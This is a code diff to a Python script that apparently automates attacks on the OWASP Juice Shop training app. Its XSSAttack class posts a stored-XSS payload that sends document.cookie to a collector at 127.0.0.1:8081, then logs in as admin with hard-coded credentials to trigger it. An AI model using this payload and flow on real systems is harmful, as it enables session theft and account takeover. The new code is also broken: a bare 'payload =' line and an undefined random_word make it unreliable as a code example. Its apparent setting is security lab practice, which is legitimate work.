@@ -5,6 +5,8 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from abc import ABC, abstractmethod 
 
+from ..userAction_headless import User
+
 
 BASE_URL = "http://localhost:3000"
 
@@ -143,8 +145,11 @@ class XSSAttack(Attack):
         """
 
         url = self.base_url + "/api/Users"
-
-        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\"+document.cookie onerror=alert(document.cookie);>\", \"password\": \"xss\"}"
+    
+        payload = 
+            "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/" + 
+            random_word + 
+            ".php?c=\\\"+document.cookie>\", \"password\": \"xss\"}"
         headers = {
             'Content-Type': 'application/json'
         }
@@ -153,7 +158,16 @@ class XSSAttack(Attack):
 
         print(response.text.encode('utf8'))
         # login as admin
-
+        time.sleep(3)
+        admin = User(
+                email='admin@juice-sh.op', 
+                password='admin123',
+                security_question='middlename',
+                user_number=7,
+                visible=True)
+        admin.login()
+        admin.driver.get(self.base_url + "/#/administration")
+        time.sleep(5)
 
 class SensitiveDataExposure(Attack):
     """
